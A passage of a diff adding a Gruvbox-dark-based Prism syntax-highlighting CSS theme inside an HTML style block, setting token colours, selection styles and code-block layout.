+		 * Adapted from a theme based on:
+		 * Vim Gruvbox dark Theme (https://github.com/morhetz/gruvbox)
+		 *
+		 * @author Azat S. <to@azat.io>
+		 * @version 1.0
+		 */
+
+		code[class*="language-"],
+		pre[class*="language-"] {
+			color: #ebdbb2; /* fg1 / fg */
+			font-family: Consolas, Monaco, "Andale Mono", monospace;
+			direction: ltr;
+			text-align: left;
+			white-space: pre;
+			word-spacing: normal;
+			word-break: normal;
+			line-height: 1.5;
+
+			-moz-tab-size: 4;
+			-o-tab-size: 4;
+			tab-size: 4;
+
+			-webkit-hyphens: none;
+			-moz-hyphens: none;
+			-ms-hyphens: none;
+			hyphens: none;
+		}
+
+		pre[class*="language-"]::-moz-selection,
+		pre[class*="language-"] ::-moz-selection,
+		code[class*="language-"]::-moz-selection,
+		code[class*="language-"] ::-moz-selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		pre[class*="language-"]::selection,
+		pre[class*="language-"] ::selection,
+		code[class*="language-"]::selection,
+		code[class*="language-"] ::selection {
+			color: #fbf1c7; /* fg0 */
+			background: #7c6f64; /* bg4 */
+		}
+
+		/* Code blocks */
+		pre[class*="language-"] {
+			padding: 1em;
+			margin: 0.5em 0;
+			overflow: auto;
+		}
+
+		:not(pre) > code[class*="language-"],
+		pre[class*="language-"] {
+			background: #191B1C; /* bg0_h */
+			border: 1px solid #665C54;
+		}
+
+		/* Inline code */
+		:not(pre) > code[class*="language-"] {
+			padding: 0.1em;
+			border-radius: 0.3em;
+		}
+
+		.token.comment,
+		.token.prolog,
+		.token.cdata {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.delimiter,
+		.token.boolean,
+		.token.keyword,
+		.token.selector,
+		.token.important,
+		.token.atrule {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.operator,
+		.token.punctuation,
+		.token.attr-name {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.tag,
+		.token.tag .punctuation,
+		.token.doctype,
+		.token.builtin {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.entity,
+		.token.number,
+		.token.symbol {
+			color: #d3869b; /* purple2 */
+		}
+
+		.token.property,
+		.token.constant,
+		.token.variable {
+			color: #fb4934; /* red2 */
+		}
+
+		.token.string,
+		.token.char {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.attr-value,
+		.token.attr-value .punctuation {
+			color: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.url {
+			color: #b8bb26; /* green2 */
+		}
+
+		.token.function {
+			color: #fabd2f; /* yellow2 */
+		}
+
+		.token.regex {
+			background: oklch(0.8591 0 126.59 / 15.94%); /* green2 */
+		}
+
+		.token.bold {
+			font-weight: bold;
+		}
+
+		.token.italic {
+			font-style: italic;
+		}
+
+		.token.inserted {
+			background: #a89984; /* fg4 / gray1 */
+		}
+
+		.token.deleted {
+			background: #fb4934; /* red2 */
+		}
+	</style>
+</html>
